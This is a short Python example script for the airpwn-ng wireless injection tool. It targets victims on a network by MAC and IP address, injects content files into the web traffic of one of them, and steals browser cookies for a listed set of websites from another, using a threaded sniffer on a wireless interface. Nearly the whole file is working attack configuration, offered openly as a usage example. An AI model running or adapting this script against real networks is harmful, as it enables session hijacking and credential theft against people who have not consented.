import lib.airpwn_ng as AIRPWN_NG

#EXAMPLE API
#This targets victim v1 (00:01:02:03:04:05) with example-injects/wargames,
#targets victim v2 (192.168.1.123) for cookie stealing for the
#websites in 'websites_list.txt' and finally it targets victim v3
#with 
#It is an example of more precise targeting that can be accomplished
#through simple scripting
victims=[]
vp=AIRPWN_NG.VictimParameters(inject_file="example-injects/wargames")
vp2=AIRPWN_NG.VictimParameters(websites="websites_list.txt")
vp3=AIRPWN_NG.VictimParameters(inject_file="example-injects/ballsy")
v1=AIRPWN_NG.Victim(mac="00:01:02:03:04:05",victim_parameters=vp)
v2=AIRPWN_NG.Victim(ip="192.168.1.123",victim_parameters=vp2)
victims.append(v1)
victims.append(v2)
ph=AIRPWN_NG.PacketHandler(i="wlan0",victims=victims,victim_parameters=vp3)
snif=AIRPWN_NG.Sniffer(ph,m="tap0")
snif.threaded_sniff()
